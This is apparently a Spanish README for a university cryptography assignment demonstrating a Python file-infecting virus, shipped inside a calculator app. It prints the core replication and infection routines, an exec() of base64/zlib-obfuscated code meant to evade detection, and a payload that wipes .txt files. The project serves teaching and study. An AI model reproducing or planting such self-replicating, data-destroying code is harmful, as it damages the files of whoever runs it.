# Virus en Python #

### Integrantes ###
| Nombre | Padrón |
| ------ | ------ |
| Carol Lugones Ignacio | 100073 |
| Lovera Daniel  | 103442 |
| Torresetti Lisandro | 99846 |
| Zaietz Azul | 102214 |

[Virus en Python - Informe de Trabajo Práctico](assets/informe.pdf)

## Dependencias

+ Python 3.10.* en adelante

+ Tkinter (`pip install tkinter`)

## Ejecución de scripts ##

**Calculadora**   
Aplicación simple que lanza una calculadora en pantalla, incluye el virus transformado dentro del código fuente, por lo tanto su ejecución infectará todos los archivos que se encuentren en el mismo directorio en donde se encuentre el archivo `virus.py`.

- `RUN: python3 calculator.py`

**Virus**   
Código fuente del virus, si se ejecuta infectará todos los archivos que se encuentren en el mismo directorio en donde se encuentre el archivo `virus.py`

- `RUN: python3 virus.py`

## Introducción ##

La siguiente implementación consiste en una demostración de un virus informático simple como parte del trabajo práctico
para la cátedra, Criptografía 66.69 de Facultad de Ingeniería de la UBA. El virus es capaz de copiarse a si mismo sobre otros scripts
de python (.py) que esten contenidos en el directorio actual en donde se ejecuta. Para intentar ocultar el código fuente insertado
en estos archivos se codifica en base64, comprime su contenido y para lograr aleatoriedad en el resultado se insertan comentarios 
aleatorios en el código.

Los archivos infectados incluyen el código transformado junto a dos tags, iniciales y finales que se utilizan tanto como para poder identificar que porcion del código se debe copiar a otros archivos como para evitar duplicar el código sobre otros archivos ya infectados. Estos tags se generan en funcion del nombre del archivo, por lo tanto varian por archivo infectado para agregar aleatoriedad sobre los tags que identifican al virus.

## Detalles de implementación ##
El virus consta principalmente de dos etapas:

**Replica**:   
Define que los archivos a infectar seran aquellos con extension .py y que se encuentran en el directorio actual
```python
def replicate():
    virus = read_virus_code()
    for file_path in find_files("*.py", "."):
        infect(file_path, virus)
```

Para leer el código del virus en un archivo que se encuentra infectado se buscan los tags de inicio y final dentro del mismo, los cuales se definen con el nombre del archivo y un hash para dificultar el entendimiento de las etiquetas.
```python
def get_tags(file_path):
    file_name = os.path.basename(file_path)
    begin_hash_tag = hashlib.md5((file_name + "/begin").encode("utf-8")).hexdigest()
    end_hash_tag = hashlib.md5((file_name + "/end").encode("utf-8")).hexdigest()
    begin_tag = "# " + begin_hash_tag
    end_tag = "# " + end_hash_tag
    return [ begin_tag, end_tag ]
```

Para infectar un archivo se procesa el codigo para que no se pueda reconocer a vista la nueva porcion de codigo dentro de un archivo. El procesamiento consiste en tres etapas:
1. **Transformar el código**: ```transform_virus_code(...)```   
Agrega aleatoriedad al script, asi cuando se codifique siempre dara resultados diferentes sin alterar las el código.
2. **Codifica el código base**: ```obscure_virus_code(...)```   
Codifica en base64 el codigo y lo comprime para que sea inentendible.
3. **Incorporar script de ejecución**:   
Concatena el código del virus codificado junto a las instrucciones de decodificado y decompresion para que pueda ser interpretado por python.
```python
def infect(file_path, virus):
    file_infected = False
    [ begin_tag, end_tag ] = get_tags(file_path)

    data = read_file_lines(file_path)
    for line in data:
        if begin_tag in line:
            file_infected = True
            break

    if not file_infected:
        with open(file_path, "w") as clean_file:
            clean_file.write(begin_tag + "\n")
            transformed_virus_code = transform_virus_code(virus)
            obscured_virus_code = obscure_virus_code(transformed_virus_code)
            executable = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode(" + str(obscured_virus_code) + ")))\")" + "\n"
            clean_file.write(executable)
            clean_file.write(end_tag + "\n")
            clean_file.writelines(data)
```

**Ejecución**:   
Define la acción que el virus ejecuta una vez que se haya replicado. En este caso es algo tan sencillo como eliminar informacion (archivos con extension txt) del ordenador del usuario.
```python
def execute_payload():
    txt_pattern = "*.txt"
    txt_files = glob.glob(txt_pattern)
    file_paths = txt_files
    
    for file_path in file_paths:
        clear_file(file_path)
```

## Test

Para ver el efecto del virus ejecutar realizar los siguientes pasos:

1. `RUN: cat TEST.txt`.

2. `RUN: cat target1.py`.

3. `RUN: cat target2.py`.

4. Verificar el contenido de los archivos mencionados anteriormente.

5. Ejecutar el código de la calculadora

6. Repetir los pasos del 1 al 4. Notar que los archivos fueron modificados.